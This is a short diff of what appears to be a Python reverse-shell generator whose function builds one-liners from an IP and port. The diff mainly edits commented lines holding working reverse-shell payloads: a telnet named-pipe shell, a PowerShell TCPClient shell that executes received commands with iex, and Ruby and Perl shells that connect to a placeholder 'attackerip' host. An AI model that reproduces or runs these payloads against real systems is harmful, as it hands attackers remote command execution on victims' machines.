@@ -77,13 +77,12 @@ def onel(ip,port,long):
                    f'rm -f /tmp/p; mknod /tmp/p p && telnet {ip} {port} 0/tmp/p','\n']
 
 
- 
+ ####FOR RE USE
 
 ##WINDOWS
 #If the target system is running Windows use the following one-liner:
 #powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',5000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-#    ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
-#//Windows target
+#ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 #perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 
 ##########################
